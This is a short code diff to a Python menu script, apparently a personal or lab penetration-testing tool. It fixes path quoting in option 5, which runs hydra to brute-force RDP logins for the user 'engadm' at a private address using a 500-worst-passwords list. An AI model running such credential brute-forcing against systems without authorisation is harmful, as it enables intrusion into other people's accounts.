@@ -31,7 +31,7 @@ elif user_input == "5":
     path = os.path.abspath(os.getcwd())
     forward_slash_path = path.replace("\\", "/")
     formatted_path = forward_slash_path.replace("C:/", "/mnt/c/")
-    os.system(f"wsl hydra -t 1 -V -f -l engadm -P "+formatted_path+"/scripts/commonpasswords/500-worst-passwords.txt rdp://192.168.0.199")
+    os.system(f'wsl hydra -t 1 -V -f -l engadm -P "{formatted_path}/scripts/commonpasswords/500-worst-passwords.txt" rdp://192.168.0.199')
  
 elif user_input == "6":
     print("WIP")
